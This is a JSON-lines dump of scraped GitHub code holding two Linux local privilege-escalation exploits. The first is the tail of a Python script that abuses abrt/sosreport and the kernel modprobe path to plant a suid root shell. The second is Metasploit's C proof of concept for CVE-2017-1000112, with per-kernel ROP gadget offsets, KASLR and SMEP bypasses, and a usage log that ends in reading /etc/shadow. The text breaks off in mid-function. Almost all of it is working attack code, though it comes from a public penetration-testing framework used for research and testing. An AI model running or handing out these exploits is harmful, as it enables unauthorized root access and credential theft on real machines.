/tmp/sh\\n\"\n\npid = os.fork()\n\nif pid == 0:\n\tos.execl(\"/usr/bin/sleep\",\"sleep\",\"100\")\n\ntime.sleep(0.5)\n\nprint \"crashing pid %d\" % pid\n\nos.kill(pid,11)\n\nprint \"waiting for dump directory\"\n\ndef waitpath(p):\n\twhile 1:\n\t\tr = glob.glob(p)\n\t\tif len(r) > 0:\n\t\t\treturn r\n\t\ttime.sleep(0.05)\t\n\ndumpdir = waitpath(\"/var/tmp/abrt/cc*%d\" % pid)[0]\n\nprint \"dump directory: \", dumpdir\n\nos.chdir(dumpdir)\n\nprint \"waiting for sosreport directory\"\n\nsosreport = waitpath(\"sosreport-*\")[0]\n\nprint \"sosreport: \", sosreport\n\nprint \"waiting for tmpfiles\"\ntmpfiles = waitpath(\"tmp*\")\n\nprint \"tmpfiles: \", tmpfiles\n\nprint \"moving directory\"\n\nos.rename(sosreport, sosreport + \".old\")\nos.mkdir(sosreport)\nos.chmod(sosreport,0777)\n\nos.mkdir(sosreport + \"/sos_logs\")\nos.chmod(sosreport + \"/sos_logs\",0777)\n\nos.symlink(\"/proc/sys/kernel/modprobe\",sosreport + \"/sos_logs/sos.log\")\nos.symlink(\"/proc/sys/kernel/modprobe\",sosreport + \"/sos_logs/ui.log\")\n\nprint \"moving tmpfiles\"\n\nfor x in tmpfiles:\n\tprint \"%s -> %s\" % (x,x + \".old\")\n\tos.rename(x, x + \".old\")\n\topen(x, \"w+\").write(\"/tmp/hax.sh\\n\")\n\tos.chmod(x,0666)\n\n\nos.chdir(\"/\")\n\nsys.stderr.write(\"waiting for sosreport to finish (can take several minutes)..\")\n\n\ndef trigger():\n\topen(\"/tmp/hax.sh\",\"w+\").write(payload)\n\tos.chmod(\"/tmp/hax.sh\",0755)\n\ttry: socket.socket(socket.AF_INET,socket.SOCK_STREAM,132)\n\texcept: pass\n\ttime.sleep(0.5)\n\ttry:\n\t\tos.stat(\"/tmp/sh\")\n\texcept:\n\t\tprint \"could not create suid\"\n\t\tsys.exit(-1)\n\tprint \"success\"\n\tos.execl(\"/tmp/sh\",\"sh\",\"-p\",\"-c\",'''echo /sbin/modprobe > /proc/sys/kernel/modprobe;rm -f /tmp/sh;python -c \"import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\"''')\n\tsys.exit(-1)\n\nfor x in xrange(0,60*10):\n\tif \"/tmp/hax\" in open(\"/proc/sys/kernel/modprobe\").read():\n\t\tprint \"done\"\n\t\ttrigger()\n\ttime.sleep(1)\n\tsys.stderr.write(\".\")\n\nprint \"timed out\"", "timestamp": "2025-10-24T23:42:02.716823"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/cve-2017-1000112/exploit.c", "content": "// A proof-of-concept local root exploit for CVE-2017-1000112.\n// Includes KASLR and SMEP bypasses. No SMAP bypass.\n// Tested on:\n// - Ubuntu trusty 4.4.0 kernels\n// - Ubuntu xenial 4.4.0 and 4.8.0 kernels\n// - Linux Mint rosa 4.4.0 kernels\n// - Linux Mint sarah 4.8.0 kernels\n// - Zorin OS 12.1 4.4.0-39 kernel\n//\n// Usage:\n// user@ubuntu:~$ uname -a\n// Linux ubuntu 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\n// user@ubuntu:~$ whoami\n// user\n// user@ubuntu:~$ id\n// uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n// user@ubuntu:~$ gcc pwn.c -o pwn\n// user@ubuntu:~$ ./pwn \n// [.] starting\n// [.] checking kernel version\n// [.] kernel version '4.8.0-58-generic' detected\n// [~] done, version looks good\n// [.] checking SMEP and SMAP\n// [~] done, looks good\n// [.] setting up namespace sandbox\n// [~] done, namespace sandbox set up\n// [.] KASLR bypass enabled, getting kernel addr\n// [~] done, kernel text:   ffffffffae400000\n// [.] commit_creds:        ffffffffae4a5d20\n// [.] prepare_kernel_cred: ffffffffae4a6110\n// [.] SMEP bypass enabled, mmapping fake stack\n// [~] done, fake stack mmapped\n// [.] executing payload ffffffffae40008d\n// [~] done, should be root now\n// [.] checking if we got root\n// [+] got r00t ^_^\n// root@ubuntu:/home/user# whoami\n// root\n// root@ubuntu:/home/user# id\n// uid=0(root) gid=0(root) groups=0(root)\n// root@ubuntu:/home/user# cat /etc/shadow\n// root:!:17246:0:99999:7:::\n// daemon:*:17212:0:99999:7:::\n// bin:*:17212:0:99999:7:::\n// sys:*:17212:0:99999:7:::\n// ...\n//\n// Andrey Konovalov <andreyknvl@gmail.com>\n// ---\n// Updated by <bcoles@gmail.com>\n// - support for distros based on Ubuntu kernel\n// - additional kernel targets\n// - additional KASLR bypasses\n// https://github.com/bcoles/kernel-exploits/tree/cve-2017-1000112\n\n#define _GNU_SOURCE\n\n#include <fcntl.h>\n#include <sched.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#include <linux/socket.h>\n#include <netinet/ip.h>\n#include <sys/klog.h>\n#include <sys/mman.h>\n#include <sys/utsname.h>\n\n#define DEBUG\n\n#ifdef DEBUG\n#\tdefine dprintf printf\n#else\n#\tdefine dprintf\n#endif\n\n#define ENABLE_KASLR_BYPASS\t\t1\n#define ENABLE_SMEP_BYPASS\t\t1\n\nchar* SHELL = \"/bin/bash\";\n\n// Will be overwritten if ENABLE_KASLR_BYPASS is enabled.\nunsigned long KERNEL_BASE =\t\t0xffffffff81000000ul;\n\n// Will be overwritten by detect_kernel().\nint kernel = -1;\n\nstruct kernel_info {\n\tconst char* distro;\n\tconst char* version;\n\tuint64_t commit_creds;\n\tuint64_t prepare_kernel_cred;\n\tuint64_t xchg_eax_esp_ret;\n\tuint64_t pop_rdi_ret;\n\tuint64_t mov_dword_ptr_rdi_eax_ret;\n\tuint64_t mov_rax_cr4_ret;\n\tuint64_t neg_rax_ret;\n\tuint64_t pop_rcx_ret;\n\tuint64_t or_rax_rcx_ret;\n\tuint64_t xchg_eax_edi_ret;\n\tuint64_t mov_cr4_rdi_ret;\n\tuint64_t jmp_rcx;\n};\n\nstruct kernel_info kernels[] = {\n\t{ \"trusty\", \"4.4.0-21-generic\", 0x9d7a0, 0x9da80, 0x4520a, 0x30f75, 0x109957, 0x1a7a0, 0x3d6b7a, 0x1cbfc, 0x76453, 0x49d4d, 0x61300, 0x1b91d },\n\t{ \"trusty\", \"4.4.0-22-generic\", 0x9d7e0, 0x9dac0, 0x4521a, 0x28c19d, 0x1099b7, 0x1a7f0, 0x3d781a, 0x1cc4c, 0x764b3, 0x49d5d, 0x61300, 0x48040 },\n\t{ \"trusty\", \"4.4.0-24-generic\", 0x9d5f0, 0x9d8d0, 0x4516a, 0x1026cd, 0x107757, 0x1a810, 0x3d7a9a, 0x1cc6c, 0x763b3, 0x49cbd, 0x612f0, 0x47fa0 },\n\t{ \"trusty\", \"4.4.0-28-generic\", 0x9d760, 0x9da40, 0x4516a, 0x3dc58f, 0x1079a7, 0x1a830, 0x3d801a, 0x1cc8c, 0x763b3, 0x49cbd, 0x612f0, 0x47fa0 },\n\t{ \"trusty\", \"4.4.0-31-generic\", 0x9d760, 0x9da40, 0x4516a, 0x3e223f, 0x1079a7, 0x1a830, 0x3ddcca, 0x1cc8c, 0x763b3, 0x49cbd, 0x612f0, 0x47fa0 },\n\t{ \"trusty\", \"4.4.0-34-generic\", 0x9d760, 0x9da40, 0x4510a, 0x355689, 0x1079a7, 0x1a830, 0x3ddd1a, 0x1cc8c, 0x763b3, 0x49c5d, 0x612f0, 0x47f40 },\n\t{ \"trusty\", \"4.4.0-36-generic\", 0x9d770, 0x9da50, 0x4510a, 0x1eec9d, 0x107a47, 0x1a830, 0x3de02a, 0x1cc8c, 0x763c3, 0x29595, 0x61300, 0x47f40 },\n\t{ \"trusty\", \"4.4.0-38-generic\", 0x9d820, 0x9db00, 0x4510a, 0x598fd, 0x107af7, 0x1a820, 0x3de8ca, 0x1cc7c, 0x76473, 0x49c5d, 0x61300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-42-generic\", 0x9d870, 0x9db50, 0x4510a, 0x5f13d, 0x107b17, 0x1a820, 0x3deb7a, 0x1cc7c, 0x76463, 0x49c5d, 0x61300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-45-generic\", 0x9d870, 0x9db50, 0x4510a, 0x5f13d, 0x107b17, 0x1a820, 0x3debda, 0x1cc7c, 0x76463, 0x49c5d, 0x61300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-47-generic\", 0x9d940, 0x9dc20, 0x4511a, 0x171f8d, 0x107bd7, 0x1a820, 0x3e241a, 0x1cc7c, 0x76463, 0x299f5, 0x61300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-51-generic\", 0x9d920, 0x9dc00, 0x4511a, 0x21f15c, 0x107c77, 0x1a820, 0x3e280a, 0x1cc7c, 0x76463, 0x49c6d, 0x61300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-53-generic\", 0x9d920, 0x9dc00, 0x4511a, 0x21f15c, 0x107c77, 0x1a820, 0x3e280a, 0x1cc7c, 0x76463, 0x49c6d, 0x61300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-57-generic\", 0x9ebb0, 0x9ee90, 0x4518a, 0x39401d, 0x1097d7, 0x1a820, 0x3e527a, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-59-generic\", 0x9ebb0, 0x9ee90, 0x4518a, 0x2dbc4e, 0x1097d7, 0x1a820, 0x3e571a, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-62-generic\", 0x9ebe0, 0x9eec0, 0x4518a, 0x3ea46f, 0x109837, 0x1a820, 0x3e5e5a, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-63-generic\", 0x9ebe0, 0x9eec0, 0x4518a, 0x2e2e7d, 0x109847, 0x1a820, 0x3e61ba, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-64-generic\", 0x9ebe0, 0x9eec0, 0x4518a, 0x2e2e7d, 0x109847, 0x1a820, 0x3e61ba, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-66-generic\", 0x9ebe0, 0x9eec0, 0x4518a, 0x2e2e7d, 0x109847, 0x1a820, 0x3e61ba, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-67-generic\", 0x9eb60, 0x9ee40, 0x4518a, 0x12a9dc, 0x109887, 0x1a820, 0x3e67ba, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-70-generic\", 0x9eb60, 0x9ee40, 0x4518a, 0xd61a2, 0x109887, 0x1a820, 0x3e63ca, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-71-generic\", 0x9eb60, 0x9ee40, 0x4518a, 0xd61a2, 0x109887, 0x1a820, 0x3e63ca, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-72-generic\", 0x9eb60, 0x9ee40, 0x4518a, 0xd61a2, 0x109887, 0x1a820, 0x3e63ca, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-75-generic\", 0x9eb60, 0x9ee40, 0x4518a, 0x303cfd, 0x1098a7, 0x1a820, 0x3e67ea, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-78-generic\", 0x9eb70, 0x9ee50, 0x4518a, 0x30366d, 0x1098b7, 0x1a820, 0x3e710a, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },\n\t{ \"trusty\", \"4.4.0-79-generic\", 0x9ebb0, 0x9ee90, 0x4518a, 0x3ebdcf, 0x1099a7, 0x1a830, 0x3e77ba, 0x1cc8c, 0x774e3, 0x49cdd, 0x62330, 0x1a78b },\n\t{ \"trusty\", \"4.4.0-81-generic\", 0x9ebb0, 0x9ee90, 0x4518a, 0x2dc688, 0x1099a7, 0x1a830, 0x3e789a, 0x1cc8c, 0x774e3, 0x24487, 0x62330, 0x1a78b },\n\t{ \"trusty\", \"4.4.0-83-generic\", 0x9ebc0, 0x9eea0, 0x451ca, 0x2dc6f5, 0x1099b7, 0x1a830, 0x3e78fa, 0x1cc8c, 0x77533, 0x49d1d, 0x62360, 0x1a78b },\n\t{ \"trusty\", \"4.4.0-87-generic\", 0x9ec20, 0x9ef00, 0x8a, 0x253b93, 0x109a17, 0x1a840, 0x3e7cda, 0x1cc8c, 0x77533, 0x49d1d, 0x62360, 0x1a78b },\n\t{ \"trusty\", \"4.4.0-89-generic\", 0x9ec30, 0x9ef10, 0x8a, 0x3ec5cF, 0x109a27, 0x1a830, 0x3e7fba, 0x1cc7c, 0x77523, 0x49d1d, 0x62360, 0x1a77b },\n\t{ \"xenial\", \"4.4.0-81-generic\", 0xa2800, 0xa2bf0, 0x8a, 0x3eb4ad, 0x112697, 0x1b9c0, 0x40341a, 0x1de6c, 0x7a453, 0x125787, 0x64580, 0x49ed0 },\n\t{ \"xenial\", \"4.4.0-89-generic\", 0xa28a0, 0xa2c90, 0x8a, 0x33e60d, 0x112777, 0x1b9b0, 0x403a1a, 0x1de5c, 0x7a483, 0x1084e5, 0x645b0, 0x3083d },\n\t{ \"xenial\", \"4.8.0-34-generic\", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },\n\t{ \"xenial\", \"4.8.0-36-generic\", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },\n\t{ \"xenial\", \"4.8.0-39-generic\", 0xa5cf0, 0xa60e0, 0x17c55, 0xf3980, 0x1191f7, 0x1b170, 0x43996a, 0x2e8363, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },\n\t{ \"xenial\", \"4.8.0-41-generic\", 0xa5cf0, 0xa60e0, 0x17c55, 0xf3980, 0x1191f7, 0x1b170, 0x43996a, 0x2e8363, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },\n\t// { \"xenial\", \"4.8.0-42-generic\", 0xa5cf0, 0xa60e0, 0x8d, 0x4149ad, 0x1191f7, 0x1b170, 0x439d7a, 0x185493, 0x7bcf3, 0xdfc5, 0x64210, 0xb2df1b },\n\t// { \"xenial\", \"4.8.0-44-generic\", 0xa5cf0, 0xa60e0, 0x8d, 0x100935, 0x1191f7, 0x1b170, 0x43999a, 0x185493, 0x7bcf3, 0xdfc5, 0x64210, 0xb2df17 },\n\t{ \"xenial\", \"4.8.0-45-generic\", 0xa5cf0, 0xa60e0, 0x17c55, 0x100935, 0x1191f7, 0x1b170, 0x43999a, 0x185493, 0x7bcf3, 0xdfc5, 0x64210, 0x49f60 },\n\t{ \"xenial\", \"4.8.0-46-generic\", 0xa5cf0, 0xa60e0, 0x17c55, 0x100935, 0x1191f7, 0x1b170, 0x43999a, 0x185493, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },\n\t{ \"xenial\", \"4.8.0-49-generic\", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x439bba, 0x102e33, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },\n\t{ \"xenial\", \"4.8.0-51-generic\", 0xa5d00, 0xa60f0, 0x8d, 0x301f2d, 0x119207, 0x1b170, 0x439bba, 0x102e33, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },\n\t{ \"xenial\", \"4.8.0-52-generic\", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x43a0da, 0x63e843, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },\n\t{ \"xenial\", \"4.8.0-53-generic\", 0xa5d00, 0xa60f0, 0x8d, 0x301f2d, 0x119207, 0x01b170, 0x43a0da, 0x63e843, 0x07bd03, 0x12c7d7, 0x64210, 0x49f60 },\n\t{ \"xenial\", \"4.8.0-54-generic\", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x43a0da, 0x5ada3c, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },\n\t{ \"xenial\", \"4.8.0-56-generic\", 0xa5d00, 0xa60f0, 0x17c55, 0x39d50d, 0x119207, 0x1b170, 0x43a14a, 0x44d4a0, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },\n\t{ \"xenial\", \"4.8.0-58-generic\", 0xa5d20, 0xa6110, 0x17c55, 0xe56f5, 0x119227, 0x1b170, 0x439e7a, 0x162622, 0x7bd23, 0x12c7f7, 0x64210, 0x49fa0 },\n};\n\n// Used to get root privileges.\n#define COMMIT_CREDS\t\t\t(KERNEL_BASE + kernels[kernel].commit_creds)\n#define PREPARE_KERNEL_CRED\t\t(KERNEL_BASE + kernels[kernel].prepare_kernel_cred)\n\n// Used when ENABLE_SMEP_BYPASS is used.\n// - xchg eax, esp ; ret\n// - pop rdi ; ret\n// - mov dword ptr [rdi], eax ; ret\n// - push rbp ; mov rbp, rsp ; mov rax, cr4 ; pop rbp ; ret\n// - neg rax ; ret\n// - pop rcx ; ret \n// - or rax, rcx ; ret\n// - xchg eax, edi ; ret\n// - push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret\n// - jmp rcx\n#define XCHG_EAX_ESP_RET\t\t(KERNEL_BASE + kernels[kernel].xchg_eax_esp_ret)\n#define POP_RDI_RET\t\t\t(KERNEL_BASE + kernels[kernel].pop_rdi_ret)\n#define MOV_DWORD_PTR_RDI_EAX_RET\t(KERNEL_BASE + kernels[kernel].mov_dword_ptr_rdi_eax_ret)\n#define MOV_RAX_CR4_RET\t\t\t(KERNEL_BASE + kernels[kernel].mov_rax_cr4_ret)\n#define NEG_RAX_RET\t\t\t(KERNEL_BASE + kernels[kernel].neg_rax_ret)\n#define POP_RCX_RET\t\t\t(KERNEL_BASE + kernels[kernel].pop_rcx_ret)\n#define OR_RAX_RCX_RET\t\t\t(KERNEL_BASE + kernels[kernel].or_rax_rcx_ret)\n#define XCHG_EAX_EDI_RET\t\t(KERNEL_BASE + kernels[kernel].xchg_eax_edi_ret)\n#define MOV_CR4_RDI_RET\t\t\t(KERNEL_BASE + kernels[kernel].mov_cr4_rdi_ret)\n#define JMP_RCX\t\t\t\t(KERNEL_BASE + kernels[kernel].jmp_rcx)\n\n// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *\n\ntypedef unsigned long __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);\ntypedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);\n\nvoid get_root(void) {\n\t((_commit_creds)(COMMIT_CREDS))(\n\t    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));\n}\n\n// * * * * * * * * * * * * * * * * SMEP bypass * * * * * * * * * * * * * * * *\n\nuint64_t saved_esp;\n\n// Unfortunately GCC does not support `__atribute__((naked))` on x86, which\n// can be used to omit a function's prologue, so I had to use this weird\n// wrapper hack as a workaround. Note: Clang does support it, which means it\n// has better support of GCC attributes than GCC itself. Funny.\nvoid wrapper() {\n\tasm volatile (\"\t\t\t\t\t\\n\\\n\tpayload:\t\t\t\t\t\\n\\\n\t\tmovq %%rbp, %%rax\t\t\t\\n\\\n\t\tmovq $0xffffffff00000000, %%rdx\t\t\\n\\\n\t\tandq %%rdx, %%rax\t\t\t\\n\\\n\t\tmovq %0, %%rdx\t\t\t\t\\n\\\n\t\taddq %%rdx, %%rax\t\t\t\\n\\\n\t\tmovq %%rax, %%rsp\t\t\t\\n\\\n\t\tcall get_root\t\t\t\t\\n\\\n\t\tret\t\t\t\t\t\\n\\\n\t\" : : \"m\"(saved_esp) : );\n}\n\nvoid payload();\n\n#define CHAIN_SAVE_ESP\t\t\t\t\\\n\t*stack++ = POP_RDI_RET;\t\t\t\\\n\t*stack++ = (uint64_t)&saved_esp;\t\\\n\t*stack++ = MOV_DWORD_PTR_RDI_EAX_RET;\n\n#define SMEP_MASK 0x100000\n\n#define CHAIN_DISABLE_SMEP\t\t\t\\\n\t*stack++ = MOV_RAX_CR4_RET;\t\t\\\n\t*stack++ = NEG_RAX_RET;\t\t\t\\\n\t*stack++ = POP_RCX_RET;\t\t\t\\\n\t*stack++ = SMEP_MASK;\t\t\t\\\n\t*stack++ = OR_RAX_RCX_RET;\t\t\\\n\t*stack++ = NEG_RAX_RET;\t\t\t\\\n\t*stack++ = XCHG_EAX_EDI_RET;\t\t\\\n\t*stack++ = MOV_CR4_RDI_RET;\n\n#define CHAIN_JMP_PAYLOAD                     \\\n\t*stack++ = POP_RCX_RET;               \\\n\t*stack++ = (uint64_t)&payload;        \\\n\t*stack++ = JMP_RCX;\n\nvoid mmap_stack() {\n\tuint64_t stack_aligned, stack_addr;\n\tint page_size, stack_size, stack_offset;\n\tuint64_t* stack;\n\n\tpage_size = getpagesize();\n\n\tstack_aligned = (XCHG_EAX_ESP_RET & 0x00000000fffffffful) & ~(page_size - 1);\n\tstack_addr = stack_aligned - page_size * 4;\n\tstack_size = page_size * 8;\n\tstack_offset = XCHG_EAX_ESP_RET % page_size;\n\n\tstack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,\n\t\t\tMAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);\n\tif (stack == MAP_FAILED || stack != (void*)stack_addr) {\n\t\tdprintf(\"[-] mmap()\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tstack = (uint64_t*)((char*)stack_aligned + stack_offset);\n\n\tCHAIN_SAVE_ESP;\n\tCHAIN_DISABLE_SMEP;\n\tCHAIN_JMP_PAYLOAD;\n}\n\n// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *\n\nstruct ubuf_info {\n\tuint64_t callback;\t// void (*callback)(struct ubuf_info *, bool)\n\tuint64_t ctx;\t\t// void *\n\tuint64_t desc;\t\t// unsigned long\n};\n\nstruct skb_shared_info {\n\tuint8_t nr_frags;\t// unsigned char\n\tuint8_t tx_flags;\t// __u8\n\tuint16_t gso_size;\t// unsigned short\n\tuint16_t gso_segs;\t// unsigned short\n\tuint16_t gso_type;\t// unsigned short\n\tuint64_t frag_list;\t// struct sk_buff *\n\tuint64_t hwtstamps;\t// struct skb_shared_hwtstamps\n\tuint32_t tskey;\t\t// u32\n\tuint32_t ip6_frag_id;\t// __be32\n\tuint32_t dataref;\t// atomic_t\n\tuint64_t destructor_arg; // void *\n\tuint8_t frags[16][17];\t// skb_frag_t frags[MAX_SKB_FRAGS];\n};\n\nstruct ubuf_info ui;\n\nvoid init_skb_buffer(char* buffer, unsigned long func) {\n\tstruct skb_shared_info* ssi = (struct skb_shared_info*)buffer;\n\tmemset(ssi, 0, sizeof(*ssi));\n\n\tssi->tx_flags = 0xff;\n\tssi->destructor_arg = (uint64_t)&ui;\n\tssi->nr_frags = 0;\n\tssi->frag_list = 0;\n\n\tui.callback = func;\n}\n\n// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *\n\n#define SHINFO_OFFSET 3164\n\nvoid oob_execute(unsigned long payload) {\n\tchar buffer[4096];\n\tmemset(&buffer[0], 0x42, 4096);\n\tinit_skb_buffer(&buffer[SHINFO_OFFSET], payload);\n\n\tint s = socket(PF_INET, SOCK_DGRAM, 0);\n\tif (s == -1) {\n\t\tdprintf(\"[-] socket()\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tstruct sockaddr_in addr;\n\tmemset(&addr, 0, sizeof(addr));\n\taddr.sin_family = AF_INET;\n\taddr.sin_port = htons(8000);\n\taddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n\n\tif (connect(s, (void*)&addr, sizeof(addr))) {\n\t\tdprintf(\"[-] connect()\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tint size = SHINFO_OFFSET + sizeof(struct skb_shared_info);\n\tint rv = send(s, buffer, size, MSG_MORE);\n\tif (rv != size) {\n\t\tdprintf(\"[-] send()\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tint val = 1;\n\trv = setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &val, sizeof(val));\n\tif (rv != 0) {\n\t\tdprintf(\"[-] setsockopt(SO_NO_CHECK)\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tsend(s, buffer, 1, 0);\n\n\tclose(s);\n}\n\n// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * *\n\n#define CHUNK_SIZE 1024\n\nint read_file(const char* file, char* buffer, int max_length) {\n\tint f = open(file, O_RDONLY);\n\tif (f == -1)\n\t\treturn -1;\n\tint bytes_read = 0;\n\twhile (true) {\n\t\tint bytes_to_read = CHUNK_SIZE;\n\t\tif (bytes_to_read > max_length - bytes_read)\n\t\t\tbytes_to_read = max_length - bytes_read;\n\t\tint rv = read(f, &buffer[bytes_read], bytes_to_read);\n\t\tif (rv == -1)\n\t\t\treturn -1;\n\t\tbytes_read += rv;\n\t\tif (rv == 0)\n\t\t\treturn bytes_read;\n\t}\n}\n\n#define LSB_RELEASE_LENGTH 1024\n\nvoid get_distro_codename(char* output, int max_length) {\n\tchar buffer[LSB_RELEASE_LENGTH];\n\tchar* path = \"/etc/lsb-release\";\n\tint length = read_file(path, &buffer[0], LSB_RELEASE_LENGTH);\n\tif (length == -1) {\n               dprintf(\"[-] open/read(%s)\\n\", path);\n               exit(EXIT_FAILURE);\n\t}\n\tconst char *needle = \"DISTRIB_CODENAME=\";\n\tint needle_length = strlen(needle);\n\tchar* found = memmem(&buffer[0], length, needle, needle_length);\n\tif (found == NULL) {\n\t\tdprintf(\"[-] couldn't find DISTRIB_CODENAME in /etc/lsb-release\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tint i;\n\tfor (i = 0; found[needle_length + i] != '\\n'; i++) {\n\t\tif (i >= max_length) {\n\t\t\texit(EXIT_FAILURE);\n\t\t}\n\t\tif ((found - &buffer[0]) + needle_length + i >= length) {\n\t\t\texit(EXIT_FAILURE);\n\t\t}\n\t\toutput[i] = found[needle_length + i];\n\t}\n}\n\nstruct utsname get_kernel_version() {\n\tstruct utsname u;\n\tint rv = uname(&u);\n\tif (rv != 0) {\n\t\tdprintf(\"[-] uname()\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\treturn u;\n}\n\n#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))\n\n#define DISTRO_CODENAME_LENGTH 32\n\nvoid detect_kernel() {\n\tchar codename[DISTRO_CODENAME_LENGTH];\n\tstruct utsname u;\n\n\tu = get_kernel_version();\n\n\tif (strstr(u.machine, \"64\") == NULL) {\n\t\tdprintf(\"[-] system is not using a 64-bit kernel\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (strstr(u.version, \"-Ubuntu\") == NULL) {\n\t\tdprintf(\"[-] system is not using an Ubuntu kernel\\n\");\n\t\texit(EXIT_FAILURE);\n\t}\n\n\tif (strstr(u.version, \"14.04.1\")) {\n\t\tstrcpy(&codename[0], \"trusty\");\n\t} else if (strstr(u.version, \"16.04.1\")) {\n\t\tstrcpy(&codename[0], \"xenial\");\n\t} else {\n\t\tget_distro_codename(&codename[0], DISTRO_CODENAME_LENGTH);\n\n\t\t// Linux Mint kernel release mappings\n\t\tif (!strcmp(&codename[0], \"qiana\"))\n\t\t\tstrcpy(&codename[0], \"trusty\");\n\t\tif (!strcmp(&codename[0], \"rebecca\"))\n\t\t\tstrcpy(&codename[0], \"trusty\");\n\t\tif (!strcmp(&codename[0], \"rafaela\"))\n\t\t\tstrcpy(&codename[0], \"trusty\");\n\t\tif (!strcmp(&codename[0], \"rosa\"))\n\t\t\tstrcpy(&codename[0], \"trusty\");\n\t\tif (!strcmp(&codename[0], \"sarah\"))\n\t\t\tstrcpy(&codename[0], \"xenial\");\n\t\tif (!strcmp(&codename[0], \"serena\"))\n\t\t\tstrcpy(&codename[0], \"xenial\");\n\t\tif (!strcmp(&codename[0], \"sonya\"))\n\t\t\tstrcpy(&codename[0], \"xenial\");\n\t}\n\n\tint i;\n\tfor (i = 0; i < ARRAY_SIZE(kernels); i++) {\n\t\tif (strcmp(&codename[0], kernels[i].distro) == 0 &&\n\t\t    strcmp(u.release, kernels[i].version) == 0) {\n\t\t\tdprintf(\"[.] kernel version '%s' detected\\n\", kernels[i].version);\n\t\t\tkernel = i;\n\t\t\treturn;\n\t\t}\n\t}\n\n\tdprintf(\"[-] kernel version not recognized\\n\");\n\texit(EXIT_FAILURE);\n}\n\n#define PROC_CPUINFO_LENGTH 4096\n\n// 0 - nothing, 1 - SMEP, 2 - SMAP, 3 - SMEP & SMAP\nint smap_smep_enabled() {\n\tchar buffer[PROC_CPUINFO_LENGTH];\n\tchar* path = \"/proc/cpuinfo\";\n\tint length = read_file(path, &buffer[0], PROC_CPUINFO_LENGTH);\n\tif (length == -1) {\n\t\tdprintf(\"[-] open/read(%s)\\n\", path);\n\t\texit(EXIT_FAILURE);\n\t}\n\tint rv = 0;\n\tchar* found = memmem(&buffer[0], length, 